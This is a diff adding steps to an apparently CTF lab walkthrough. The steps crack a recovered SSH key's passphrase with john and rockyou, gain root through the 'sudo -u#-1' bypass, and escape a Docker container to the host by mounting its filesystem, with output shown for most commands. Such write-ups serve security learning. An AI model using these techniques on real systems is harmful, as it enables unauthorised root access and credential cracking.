@@ -862,8 +862,87 @@ drwx------  3 penelope penelope 4.0K Jan 12  2021 .gnupg
 
 `:> cat elusive_targets.txt`  
 
+`:> cd /home/maya/old_robert_ssh`
 
+`:> ssh2john id_rsa > outfile`
+
+`:> john --wordlist=/usr/share/wordlists/rockyou.txt outfile` : answer
 
 ### What is user.txt?
 
+`:> ss -lnp | grep tcp | grep -i listen` : identfy listening ports using tcp connections  
+
+`:> ssh -i id_rsa -p 2222 robert@locahost`  
+
+`find / -name user.txt 2>/dev/null` : no results
+
+`:> cat /home/robert/robert.txt` : nothing meaningfull  
+
+`:> sudo -l `
+
+```bash
+Matching Defaults entries for robert on ec96850005d6: <----- clue!!! Now running in a container
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User robert may run the following commands on ec96850005d6:
+    (ALL, !root) NOPASSWD: /bin/bash
+```
+
+`:> sudo -u#-1 /bin/bash`  
+
+
+```bash
+root@ec96850005d6:~# id
+uid=0(root) gid=1000(robert) groups=1000(robert)
+```
+
+`:> cat /root/user.txt` : flag`
+
 ### What is root.txt?
+
+```bash
+root@ec96850005d6:/root# find / -name docker 2>/dev/null
+/run/docker
+/tmp/docker
+```
+
+`:> cd /tmp/`
+
+`:> docker ps`  
+
+```bash  
+CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                    NAMES
+ec96850005d6        mangoman            "/usr/sbin/sshd -D"   5 years ago         Up About an hour    127.0.0.1:2222->22/tcp   kronstadt_industries
+```
+
+`:> ./docker exec -it ec96850005d6 bash`
+
+```bash
+root@ec96850005d6:/# id
+uid=0(root) gid=0(root) groups=0(root)
+```  
+
+
+#### Escape from the container to the host  
+
+Look at docker on [GTFOBINS](https://gtfobins.org/gtfobins/docker/#shell)
+
+exploit syntax: `:> docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh`
+
+docker is on the container.  
+
+`:> cd /tmp ` : docker is in this directory  
+
+
+exploit: `:> ./docker run -v /:/mnt --rm -it mangoman chroot /mnt sh`
+
+```bash
+root@ec96850005d6:/tmp# ./docker ps
+CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                    NAMES
+ec96850005d6        mangoman            "/usr/sbin/sshd -D"   5 years ago         Up About an hour    127.0.0.1:2222->22/tcp   kronstadt_industries
+root@ec96850005d6:/tmp# ./docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+`:> cat /root/root.txt`
